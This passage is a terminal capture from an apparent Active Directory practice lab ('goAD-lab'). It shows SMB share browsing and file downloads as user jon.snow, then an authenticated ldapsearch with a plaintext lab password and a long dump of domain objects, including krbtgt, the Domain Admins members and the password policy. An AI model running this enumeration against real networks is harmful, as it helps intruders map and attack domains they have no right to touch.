  north.sevenkingdoms.local          Dr        0  Sun Apr 13 18:31:11 2025

                10485247 blocks of size 4096\. 7456828 blocks available  
smb: \\\> ^C  
                                                                                                                                                     
┌──(kali㉿kali)-\[\~/goAD-lab\]  
└─$ smbclient //192.168.20.22/public \-U jon.snow  
Password for \[WORKGROUP\\jon.snow\]:  
Try "help" to get a list of possible commands.  
smb: \\\> ls  
NT\_STATUS\_ACCESS\_DENIED listing \\\*  
smb: \\\> cd  
Current directory is \\  
smb: \\\> ^C  
                                                                                                                                                     
┌──(kali㉿kali)-\[\~/goAD-lab\]  
└─$ smbclient //192.168.20.23/public \-U jon.snow

Password for \[WORKGROUP\\jon.snow\]:  
Try "help" to get a list of possible commands.  
smb: \\\> ls  
NT\_STATUS\_ACCESS\_DENIED listing \\\*  
smb: \\\> ^C  
                                                                                                                                                     
┌──(kali㉿kali)-\[\~/goAD-lab\]  
└─$ \[200\~smbclient //192.168.20.23/all \-U jon.snow  
zsh: bad pattern: \[200\~smbclient  
                                                                                                                                                     
┌──(kali㉿kali)-\[\~/goAD-lab\]  
└─$ smbclient //192.168.20.23/all \-U jon.snow  
Password for \[WORKGROUP\\jon.snow\]:  
Try "help" to get a list of possible commands.  
smb: \\\> ls  
  .                                   D        0  Tue Aug 26 16:02:42 2025  
  ..                                  D        0  Tue Aug 26 16:02:42 2025  
  Conny                               D        0  Sun May  4 14:47:42 2025  
  Reza                                D        0  Sun Apr 27 15:31:07 2025

                10485247 blocks of size 4096\. 7286313 blocks available  
smb: \\\> cd Conny  
smb: \\Conny\\\> ls  
  .                                   D        0  Sun May  4 14:47:42 2025  
  ..                                  D        0  Sun May  4 14:47:42 2025  
  connys\_textdatei.txt                A       62  Sun May  4 14:47:42 2025

                10485247 blocks of size 4096\. 7286313 blocks available  
smb: \\Conny\\\> cat connys\_textdatei.txt  
cat: command not found  
smb: \\Conny\\\> nano connys\_textdatei.txt  
nano: command not found  
smb: \\Conny\\\> vim connys\_textdatei.txt  
vim: command not found  
smb: \\Conny\\\> get connys\_textdatei.txt  
getting file \\Conny\\connys\_textdatei.txt of size 62 as connys\_textdatei.txt (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec)  
smb: \\Conny\\\> ls  
  .                                   D        0  Sun May  4 14:47:42 2025  
  ..                                  D        0  Sun May  4 14:47:42 2025  
  connys\_textdatei.txt                A       62  Sun May  4 14:47:42 2025

                10485247 blocks of size 4096\. 7286313 blocks available  
smb: \\Conny\\\> ls \-lisa  
NT\_STATUS\_NO\_SUCH\_FILE listing \\Conny\\-lisa  
smb: \\Conny\\\> cd ..  
smb: \\\> ls  
  .                                   D        0  Tue Aug 26 16:02:42 2025  
  ..                                  D        0  Tue Aug 26 16:02:42 2025  
  Conny                               D        0  Sun May  4 14:47:42 2025  
  Reza                                D        0  Sun Apr 27 15:31:07 2025

                10485247 blocks of size 4096\. 7286313 blocks available  
smb: \\\> cd Reza  
smb: \\Reza\\\> ls  
  .                                   D        0  Sun Apr 27 15:31:07 2025  
  ..                                  D        0  Sun Apr 27 15:31:07 2025  
  Test.txt                            A       55  Sun Apr 27 15:31:07 2025

                10485247 blocks of size 4096\. 7286313 blocks available  
smb: \\Reza\\\> get Test.txt  
getting file \\Reza\\Test.txt of size 55 as Test.txt (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec)  
smb: \\Reza\\\> ls  
  .                                   D        0  Sun Apr 27 15:31:07 2025  
  ..                                  D        0  Sun Apr 27 15:31:07 2025  
  Test.txt                            A       55  Sun Apr 27 15:31:07 2025

                10485247 blocks of size 4096\. 7286311 blocks available  
smb: \\Reza\\\> cd .  
smb: \\Reza\\\> ls  
  .                                   D        0  Sun Apr 27 15:31:07 2025  
  ..                                  D        0  Sun Apr 27 15:31:07 2025  
  Test.txt                            A       55  Sun Apr 27 15:31:07 2025

                10485247 blocks of size 4096\. 7286311 blocks available  
smb: \\Reza\\\> cd ..  
smb: \\\> ls  
  .                                   D        0  Tue Aug 26 16:02:42 2025  
  ..                                  D        0  Tue Aug 26 16:02:42 2025  
  Conny                               D        0  Sun May  4 14:47:42 2025  
  Reza                                D        0  Sun Apr 27 15:31:07 2025

                10485247 blocks of size 4096\. 7286183 blocks available  
smb: \\\> cd  
Current directory is \\  
smb: \\\> ls  
  .                                   D        0  Tue Aug 26 16:02:42 2025  
  ..                                  D        0  Tue Aug 26 16:02:42 2025  
  Conny                               D        0  Sun May  4 14:47:42 2025  
  Reza                                D        0  Sun Apr 27 15:31:07 2025

                10485247 blocks of size 4096\. 7286183 blocks available  
smb: \\\> ^C  
                                                                                                                                                     
┌──(kali㉿kali)-\[\~/goAD-lab\]  
└─$ ldapsearch \-x \-H ldap://192.168.20.11 \-D "jon.snow@north.sevenkingdoms.local" \-w iknownothing \-b "dc=north,dc=sevenkingdoms,dc=local"  
\# extended LDIF  
\#  
\# LDAPv3  
\# base \<dc=north,dc=sevenkingdoms,dc=local\> with scope subtree  
\# filter: (objectclass=\*)  
\# requesting: ALL  
\#

\# north.sevenkingdoms.local  
dn: DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: domain  
objectClass: domainDNS  
distinguishedName: DC=north,DC=sevenkingdoms,DC=local  
instanceType: 13  
whenCreated: 20250413163117.0Z  
whenChanged: 20250813140518.0Z  
subRefs: DC=DomainDnsZones,DC=north,DC=sevenkingdoms,DC=local  
uSNCreated: 7758  
dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAAk0vkOnilO0iaEvmcq3opUQ==  
repsTo:: AgAAAAAAAAAMAgAAAAAAAOhJvh4DAAAA6Em+HgMAAAAAAAAA2AAAADQBAAAAAAAAAAAAA  
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALQ6zwmI54V  
 Fn6dutA1QB0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANAEAABgAAAAA  
 AAAAmAAAAAAAAAAAAAAAMAA5AGMAZgAzAGEAYgA0AC0AZQA3ADgAOAAtADQANQA4ADUALQA5AGYAY  
 QA3AC0ANgBlAGIANAAwAGQANQAwADAANwA0ADAALgBfAG0AcwBkAGMAcwAuAHMAZQB2AGUAbgBrAG  
 kAbgBnAGQAbwBtAHMALgBsAG8AYwBhAGwAAAAwADkAYwBmADMAYQBiADQALQBlADcAOAA4AC0ANAA  
 1ADgANQAtADkAZgBhADcALQA2AGUAYgA0ADAAZAA1ADAAMAA3ADQAMAAuAF8AbQBzAGQAYwBzAC4A  
 cwBlAHYAZQBuAGsAaQBuAGcAZABvAG0AcwAuAGwAbwBjAGEAbAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
 AAAAAAAAAAAAAA=  
uSNChanged: 405511  
name: north  
objectGUID:: UFTsVX8oWkWwpYTuN5xMtQ==  
creationTime: 133995675180448591  
forceLogoff: \-9223372036854775808  
lockoutDuration: \-3000000000  
lockOutObservationWindow: \-3000000000  
lockoutThreshold: 5  
maxPwdAge: \-32141664000000000  
minPwdAge: \-864000000000  
minPwdLength: 5  
modifiedCountAtLastProm: 0  
nextRid: 1002  
pwdProperties: 0  
pwdHistoryLength: 24  
objectSid:: AQQAAAAAAAUVAAAAHQMSi8zSs8llODhG  
serverState: 1  
uASCompat: 1  
modifiedCount: 1  
auditingPolicy:: AAE=  
nTMixedDomain: 0  
rIDManagerReference: CN=RID Manager$,CN=System,DC=north,DC=sevenkingdoms,DC=lo  
 cal  
fSMORoleOwner: CN=NTDS Settings,CN=WINTERFELL,CN=Servers,CN=Default-First-Site  
 \-Name,CN=Sites,CN=Configuration,DC=sevenkingdoms,DC=local  
systemFlags: \-1946157056  
wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=nort  
 h,DC=sevenkingdoms,DC=local  
wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Progra  
 m Data,DC=north,DC=sevenkingdoms,DC=local  
wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=nor  
 th,DC=sevenkingdoms,DC=local  
wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrin  
 cipals,DC=north,DC=sevenkingdoms,DC=local  
wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=  
 north,DC=sevenkingdoms,DC=local  
wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=n  
 orth,DC=sevenkingdoms,DC=local  
wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=nor  
 th,DC=sevenkingdoms,DC=local  
wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=north,DC=  
 sevenkingdoms,DC=local  
wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,  
 DC=north,DC=sevenkingdoms,DC=local  
wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=north,  
 DC=sevenkingdoms,DC=local  
wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=north,DC=s  
 evenkingdoms,DC=local  
objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=l  
 ocal  
isCriticalSystemObject: TRUE  
gPLink: \[LDAP://cn={EE353C6E-B5DD-4C0A-B3BB-9A58D54B703D},cn=policies,cn=syste  
 m,DC=north,DC=sevenkingdoms,DC=local;0\]\[LDAP://CN={31B2F340-016D-11D2-945F-00  
 C04FB984F9},CN=Policies,CN=System,DC=north,DC=sevenkingdoms,DC=local;0\]  
dSCorePropagationData: 16010101000000.0Z  
otherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=north,  
 DC=sevenkingdoms,DC=local  
otherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Servic  
 e Accounts,DC=north,DC=sevenkingdoms,DC=local  
masteredBy: CN=NTDS Settings,CN=WINTERFELL,CN=Servers,CN=Default-First-Site-Na  
 me,CN=Sites,CN=Configuration,DC=sevenkingdoms,DC=local  
ms-DS-MachineAccountQuota: 10  
msDS-Behavior-Version: 7  
msDS-PerUserTrustQuota: 1  
msDS-AllUsersTrustQuota: 1000  
msDS-PerUserTrustTombstonesQuota: 10  
msDs-masteredBy: CN=NTDS Settings,CN=WINTERFELL,CN=Servers,CN=Default-First-Si  
 te-Name,CN=Sites,CN=Configuration,DC=sevenkingdoms,DC=local  
msDS-IsDomainFor: CN=NTDS Settings,CN=WINTERFELL,CN=Servers,CN=Default-First-S  
 ite-Name,CN=Sites,CN=Configuration,DC=sevenkingdoms,DC=local  
msDS-IsPartialReplicaFor: CN=NTDS Settings,CN=KINGSLANDING,CN=Servers,CN=Defau  
 lt-First-Site-Name,CN=Sites,CN=Configuration,DC=sevenkingdoms,DC=local  
msDS-NcType: 0  
msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE  
dc: north

\# Users, north.sevenkingdoms.local  
dn: CN=Users,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: Users  
description: Default container for upgraded user accounts  
distinguishedName: CN=Users,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163117.0Z  
whenChanged: 20250413163117.0Z  
uSNCreated: 7762  
uSNChanged: 7762  
showInAdvancedViewOnly: FALSE  
name: Users  
objectGUID:: QHbs4v8rB0SS7yt+769pZg==  
systemFlags: \-1946157056  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# krbtgt, Users, north.sevenkingdoms.local  
dn: CN=krbtgt,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: person  
objectClass: organizationalPerson  
objectClass: user  
cn: krbtgt  
description: Key Distribution Center Service Account  
distinguishedName: CN=krbtgt,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163148.0Z  
whenChanged: 20250501191334.0Z  
uSNCreated: 12300  
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=north,DC=seven  
 kingdoms,DC=local  
uSNChanged: 74921  
showInAdvancedViewOnly: TRUE  
name: krbtgt  
objectGUID:: rwF2lMG/oUK1759K9WnCzQ==  
userAccountControl: 514  
badPwdCount: 4  
codePage: 0  
countryCode: 0  
badPasswordTime: 133906033335870478  
lastLogoff: 0  
lastLogon: 0  
pwdLastSet: 133890355081589337  
primaryGroupID: 513  
objectSid:: AQUAAAAAAAUVAAAAHQMSi8zSs8llODhG9gEAAA==  
adminCount: 1  
accountExpires: 9223372036854775807  
logonCount: 0  
sAMAccountName: krbtgt  
sAMAccountType: 805306368  
lockoutTime: 133906004142432770  
servicePrincipalName: kadmin/changepw  
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413164658.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010714042016.0Z  
msDS-SupportedEncryptionTypes: 0

\# Domain Computers, Users, north.sevenkingdoms.local  
dn: CN=Domain Computers,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: group  
cn: Domain Computers  
description: All workstations and servers joined to the domain  
distinguishedName: CN=Domain Computers,CN=Users,DC=north,DC=sevenkingdoms,DC=l  
 ocal  
instanceType: 4  
whenCreated: 20250413163148.0Z  
whenChanged: 20250413163148.0Z  
uSNCreated: 12306  
uSNChanged: 12308  
name: Domain Computers  
objectGUID:: tVI4svnmkkW9Mmv0HsaJwQ==  
objectSid:: AQUAAAAAAAUVAAAAHQMSi8zSs8llODhGAwIAAA==  
sAMAccountName: Domain Computers  
sAMAccountType: 268435456  
groupType: \-2147483646  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# Domain Controllers, Users, north.sevenkingdoms.local  
dn: CN=Domain Controllers,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: group  
cn: Domain Controllers  
description: All domain controllers in the domain  
distinguishedName: CN=Domain Controllers,CN=Users,DC=north,DC=sevenkingdoms,DC  
 \=local  
instanceType: 4  
whenCreated: 20250413163148.0Z  
whenChanged: 20250413164658.0Z  
uSNCreated: 12309  
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=north,DC=seven  
 kingdoms,DC=local  
uSNChanged: 13663  
name: Domain Controllers  
objectGUID:: o7Iw04a10EqdPTQsC7IG/g==  
objectSid:: AQUAAAAAAAUVAAAAHQMSi8zSs8llODhGBAIAAA==  
adminCount: 1  
sAMAccountName: Domain Controllers  
sAMAccountType: 268435456  
groupType: \-2147483646  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413164658.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010714042016.0Z

\# Cert Publishers, Users, north.sevenkingdoms.local  
dn: CN=Cert Publishers,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: group  
cn: Cert Publishers  
description: Members of this group are permitted to publish certificates to th  
 e directory  
distinguishedName: CN=Cert Publishers,CN=Users,DC=north,DC=sevenkingdoms,DC=lo  
 cal  
instanceType: 4  
whenCreated: 20250413163148.0Z  
whenChanged: 20250413163148.0Z  
uSNCreated: 12312  
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=north,DC=seven  
 kingdoms,DC=local  
uSNChanged: 12314  
name: Cert Publishers  
objectGUID:: gWLPY8jWWkmCAViSefMnVA==  
objectSid:: AQUAAAAAAAUVAAAAHQMSi8zSs8llODhGBQIAAA==  
sAMAccountName: Cert Publishers  
sAMAccountType: 536870912  
groupType: \-2147483644  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# Domain Admins, Users, north.sevenkingdoms.local  
dn: CN=Domain Admins,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: group  
cn: Domain Admins  
description: Designated administrators of the domain  
member: CN=eddard.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
member: CN=Administrator,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
distinguishedName: CN=Domain Admins,CN=Users,DC=north,DC=sevenkingdoms,DC=loca  
 l  
instanceType: 4  
whenCreated: 20250413163148.0Z  
whenChanged: 20250413164658.0Z  
uSNCreated: 12315  
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=north,DC=seven  
 kingdoms,DC=local  
memberOf: CN=Administrators,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local  
uSNChanged: 13649  
name: Domain Admins  
objectGUID:: 6Iyme5s5v0+ufdO3cBFNAw==  
objectSid:: AQUAAAAAAAUVAAAAHQMSi8zSs8llODhGAAIAAA==  
adminCount: 1  
sAMAccountName: Domain Admins  
sAMAccountType: 268435456  
groupType: \-2147483646  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413164658.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010714042016.0Z

\# Domain Users, Users, north.sevenkingdoms.local  
dn: CN=Domain Users,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: group  
cn: Domain Users  
description: All domain users  
distinguishedName: CN=Domain Users,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163148.0Z  
whenChanged: 20250413163148.0Z  
uSNCreated: 12318  
memberOf: CN=Users,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local  
uSNChanged: 12320  
name: Domain Users  
objectGUID:: G8cTcsx/0EKLrPqDQNNUdA==  
objectSid:: AQUAAAAAAAUVAAAAHQMSi8zSs8llODhGAQIAAA==  
sAMAccountName: Domain Users  
sAMAccountType: 268435456  
groupType: \-2147483646  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# Domain Guests, Users, north.sevenkingdoms.local  
dn: CN=Domain Guests,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: group  
cn: Domain Guests  
description: All domain guests  
distinguishedName: CN=Domain Guests,CN=Users,DC=north,DC=sevenkingdoms,DC=loca  
 l  
instanceType: 4  
whenCreated: 20250413163148.0Z  
whenChanged: 20250413163148.0Z  
uSNCreated: 12321  
memberOf: CN=Guests,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local  
uSNChanged: 12323  
name: Domain Guests  
objectGUID:: gM4UFDfZ4EeWpWNEhp8Dmg==  
objectSid:: AQUAAAAAAAUVAAAAHQMSi8zSs8llODhGAgIAAA==  
sAMAccountName: Domain Guests  
sAMAccountType: 268435456  
groupType: \-2147483646  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# Group Policy Creator Owners, Users, north.sevenkingdoms.local  
dn: CN=Group Policy Creator Owners,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: group  
cn: Group Policy Creator Owners  
description: Members in this group can modify group policy for the domain  
member: CN=Administrator,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
distinguishedName: CN=Group Policy Creator Owners,CN=Users,DC=north,DC=sevenki  
 ngdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163148.0Z  
whenChanged: 20250413163148.0Z  
uSNCreated: 12324  
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=north,DC=seven  
 kingdoms,DC=local  
uSNChanged: 12354  
name: Group Policy Creator Owners  
objectGUID:: jxCRjVEtCEeAG6wn7ty+1Q==  
objectSid:: AQUAAAAAAAUVAAAAHQMSi8zSs8llODhGCAIAAA==  
sAMAccountName: Group Policy Creator Owners  
sAMAccountType: 268435456  
groupType: \-2147483646  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# RAS and IAS Servers, Users, north.sevenkingdoms.local  
dn: CN=RAS and IAS Servers,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: group  
cn: RAS and IAS Servers  
description: Servers in this group can access remote access properties of user  
 s  
distinguishedName: CN=RAS and IAS Servers,CN=Users,DC=north,DC=sevenkingdoms,D  
 C=local  
instanceType: 4  
whenCreated: 20250413163148.0Z  
whenChanged: 20250413163148.0Z  
uSNCreated: 12327  
uSNChanged: 12329  
name: RAS and IAS Servers  
objectGUID:: yAB14/uQW0yEIzM0e50nLQ==  
objectSid:: AQUAAAAAAAUVAAAAHQMSi8zSs8llODhGKQIAAA==  
sAMAccountName: RAS and IAS Servers  
sAMAccountType: 536870912  
groupType: \-2147483644  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# Allowed RODC Password Replication Group, Users, north.sevenkingdoms.local  
dn: CN=Allowed RODC Password Replication Group,CN=Users,DC=north,DC=sevenkingd  
 oms,DC=local  
objectClass: top  
objectClass: group  
cn: Allowed RODC Password Replication Group  
description: Members in this group can have their passwords replicated to all   
 read-only domain controllers in the domain  
distinguishedName: CN=Allowed RODC Password Replication Group,CN=Users,DC=nort  
 h,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163148.0Z  
whenChanged: 20250413163148.0Z  
uSNCreated: 12366  
uSNChanged: 12368  
name: Allowed RODC Password Replication Group  
objectGUID:: DfoJkiDTlES3h6G7kXAg8w==  
objectSid:: AQUAAAAAAAUVAAAAHQMSi8zSs8llODhGOwIAAA==  
sAMAccountName: Allowed RODC Password Replication Group  
sAMAccountType: 536870912  
groupType: \-2147483644  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# Denied RODC Password Replication Group, Users, north.sevenkingdoms.local  
dn: CN=Denied RODC Password Replication Group,CN=Users,DC=north,DC=sevenkingdo  
 ms,DC=local  
objectClass: top  
objectClass: group  
cn: Denied RODC Password Replication Group  
description: Members in this group cannot have their passwords replicated to a  
 ny read-only domain controllers in the domain  
member: CN=Enterprise Admins,CN=Users,DC=sevenkingdoms,DC=local  
member: CN=Schema Admins,CN=Users,DC=sevenkingdoms,DC=local  
member: CN=Read-only Domain Controllers,CN=Users,DC=north,DC=sevenkingdoms,DC=  
 local  
member: CN=Group Policy Creator Owners,CN=Users,DC=north,DC=sevenkingdoms,DC=l  
 ocal  
member: CN=Domain Admins,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
member: CN=Cert Publishers,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
member: CN=Domain Controllers,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
member: CN=krbtgt,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
distinguishedName: CN=Denied RODC Password Replication Group,CN=Users,DC=north  
 ,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163148.0Z  
whenChanged: 20250413171938.0Z  
uSNCreated: 12369  
uSNChanged: 17165  
name: Denied RODC Password Replication Group  
objectGUID:: GEcogfony0WJoxF7Dqop5A==  
objectSid:: AQUAAAAAAAUVAAAAHQMSi8zSs8llODhGPAIAAA==  
sAMAccountName: Denied RODC Password Replication Group  
sAMAccountType: 536870912  
groupType: \-2147483644  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# Read-only Domain Controllers, Users, north.sevenkingdoms.local  
dn: CN=Read-only Domain Controllers,CN=Users,DC=north,DC=sevenkingdoms,DC=loca  
 l  
objectClass: top  
objectClass: group  
cn: Read-only Domain Controllers  
description: Members of this group are Read-Only Domain Controllers in the dom  
 ain  
distinguishedName: CN=Read-only Domain Controllers,CN=Users,DC=north,DC=sevenk  
 ingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163148.0Z  
whenChanged: 20250413164658.0Z  
uSNCreated: 12383  
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=north,DC=seven  
 kingdoms,DC=local  
uSNChanged: 13662  
name: Read-only Domain Controllers  
objectGUID:: JNL/DWG7TUmsjPMIeeRobA==  
objectSid:: AQUAAAAAAAUVAAAAHQMSi8zSs8llODhGCQIAAA==  
adminCount: 1  
sAMAccountName: Read-only Domain Controllers  
sAMAccountType: 268435456  
groupType: \-2147483646  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413164658.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010714042016.0Z

\# Cloneable Domain Controllers, Users, north.sevenkingdoms.local  
dn: CN=Cloneable Domain Controllers,CN=Users,DC=north,DC=sevenkingdoms,DC=loca  
 l  
objectClass: top  
objectClass: group  
cn: Cloneable Domain Controllers  
description: Members of this group that are domain controllers may be cloned.  
distinguishedName: CN=Cloneable Domain Controllers,CN=Users,DC=north,DC=sevenk  
 ingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163148.0Z  
whenChanged: 20250413163148.0Z  
uSNCreated: 12399  
uSNChanged: 12401  
name: Cloneable Domain Controllers  
objectGUID:: NtILI50xaUG1nxfrGQQMTA==  
objectSid:: AQUAAAAAAAUVAAAAHQMSi8zSs8llODhGCgIAAA==  
sAMAccountName: Cloneable Domain Controllers  
sAMAccountType: 268435456  
groupType: \-2147483646  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# Protected Users, Users, north.sevenkingdoms.local  
dn: CN=Protected Users,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: group  
cn: Protected Users  
description: Members of this group are afforded additional protections against  
  authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=  
 298939 for more information.  
distinguishedName: CN=Protected Users,CN=Users,DC=north,DC=sevenkingdoms,DC=lo  
 cal  
instanceType: 4  
whenCreated: 20250413163148.0Z  
whenChanged: 20250413163148.0Z  
uSNCreated: 12404  
uSNChanged: 12406  
name: Protected Users  
objectGUID:: Lr3WN10pBkKh2ktXmkpLOw==  
objectSid:: AQUAAAAAAAUVAAAAHQMSi8zSs8llODhGDQIAAA==  
sAMAccountName: Protected Users  
sAMAccountType: 268435456  
groupType: \-2147483646  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# Key Admins, Users, north.sevenkingdoms.local  
dn: CN=Key Admins,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: group  
cn: Key Admins  
description: Members of this group can perform administrative actions on key o  
 bjects within the domain.  
